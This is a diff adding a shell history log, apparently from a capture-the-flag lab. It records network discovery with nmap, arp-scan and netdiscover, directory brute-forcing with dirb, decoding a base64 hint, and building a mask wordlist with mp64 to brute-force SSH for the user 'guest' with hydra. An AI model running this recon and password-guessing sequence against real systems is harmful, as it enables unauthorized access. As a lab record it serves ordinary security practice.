@@ -1,0 +1,125 @@
+    1  sh autorun.sh 
+    2  netdiscover -i usbo0
+    3  netdiscover -i usb0
+    4  nmap -sC -sV -PN 192.168.0.138
+    5  arp-scan -l
+    6  firefox http://192.168.0.140
+    7  arp-scan -l
+    8  firefox http://192.168.0.138
+    9  apt-get update
+   10  apt-get upgrade 
+   11  nmap -sC -sV -PN 192.168.0.138
+   12  dirb https://192.168.0.138 
+   13  dirb https://192.168.0.138:80 
+   14  dirb https://192.168.0.138 
+   15  nmap -sC -sV -PN 192.168.0.138
+   16  arp-scan -l
+   17  nmap -sC -sV -PN 192.168.0.145
+   18  dirb https://192.168.0.145
+   19  dirb https://192.168.0.145:31337
+   20  dirb https://192.168.0.145:80
+   21  dirb https://192.168.0.145:22
+   22  dirb http://192.168.0.145:31337
+   23  echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg= " | base64 -d
+   24  echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" | base64 -d
+   25  wget http://192.168.0.145:31337/%20Cypher.matrix
+   26  wget http://192.168.0.145:31337/Cypher.matrix
+   27  file Cypher.matrix 
+   28  cat Cypher.matrix 
+   29  mp64 k1ll0r?a?a
+   30  hydra -l guest
+   31  mp64 k1ll0r?a?a >list.txt
+   32  hydra -l guest -p list.txt ssh://192.168.0.145
+   33  cat list.txt 
+   34  hydra -l guest -p list.txt ssh://192.168.0.145
+   35  hydra -l guest -p list.txt ssh://192.168.0.145 -t 4
+   36  apt-get hydra
+   37  apt-get install hydra
+   38  hydra -l guest -P list.txt ssh://192.168.0.145 -t 4
+   39  hydra -R
+   40  poweroff
+   41  firefox http://31337
+   42  firefox http://192.168.0.145:31337
+   43  hydra -R
+   44  apt-get install hydra
+   45  history >cmd1.txt
+    1  sh autorun.sh 
+    2  netdiscover -i usbo0
+    3  netdiscover -i usb0
+    4  nmap -sC -sV -PN 192.168.0.138
+    5  arp-scan -l
+    6  firefox http://192.168.0.140
+    7  arp-scan -l
+    8  firefox http://192.168.0.138
+    9  apt-get update
+   10  apt-get upgrade 
+   11  nmap -sC -sV -PN 192.168.0.138
+   12  dirb https://192.168.0.138 
+   13  dirb https://192.168.0.138:80 
+   14  dirb https://192.168.0.138 
+   15  nmap -sC -sV -PN 192.168.0.138
+   16  arp-scan -l
+   17  nmap -sC -sV -PN 192.168.0.145
+   18  dirb https://192.168.0.145
+   19  dirb https://192.168.0.145:31337
+   20  dirb https://192.168.0.145:80
+   21  dirb https://192.168.0.145:22
+   22  dirb http://192.168.0.145:31337
+   23  echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg= " | base64 -d
+   24  echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" | base64 -d
+   25  wget http://192.168.0.145:31337/%20Cypher.matrix
+   26  wget http://192.168.0.145:31337/Cypher.matrix
+   27  file Cypher.matrix 
+   28  cat Cypher.matrix 
+   29  mp64 k1ll0r?a?a
+   30  hydra -l guest
+   31  mp64 k1ll0r?a?a >list.txt
+   32  hydra -l guest -p list.txt ssh://192.168.0.145
+   33  cat list.txt 
+   34  hydra -l guest -p list.txt ssh://192.168.0.145
+   35  hydra -l guest -p list.txt ssh://192.168.0.145 -t 4
+   36  apt-get hydra
+   37  apt-get install hydra
+   38  hydra -l guest -P list.txt ssh://192.168.0.145 -t 4
+   39  hydra -R
+   40  poweroff
+   41  firefox http://31337
+   42  firefox http://192.168.0.145:31337
+   43  hydra -R
+   44  ssh guest@192.168.0.145
+   45  apt-get install hydra
+   46  history >cmd1.txt
+   47  cat cmd1.txt 
+   48  cp cmd1.txt /root/Desktop/
+   49  firefox
+   50  apt-get upgrade 
+   51  arp-scan -l
+   52  arp-scan -l
+   53  nmap -A -p- 192.168.0.146
+   54  arp-scan -l
+   55  firefox https://192.168.0.146:1337
+   56  poweroff
+   57  apt-get upgrade 
+   58  pluma /etc/apt/sources.list.d/parrot.list
+   59  apt-get upgrade 
+   60  poweroff 
+   61  apt-get upgrade -y -y
+   62  apt-get update
+   63  apt list --upgradable
+   64  apt-get update
+   65  apt --fix-missing
+   66  apt install --fix-missing 
+   67  apt list --upgradable
+   68  apt-get update
+   69  ifconfig 
+   70  poweroff 
+   71  apt-get upgrade 
+   72  apt-get upgrade -y
+   73  apt-get update
+   74  apt-get update
+   75  pluma /etc/apt/sources.list.d/parrot.list
+   76  apt-get update
+   77  echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf > /dev/null 
+   78  apt-get update
+   79  ping google.com
+   80  history >>cmd1.txt 
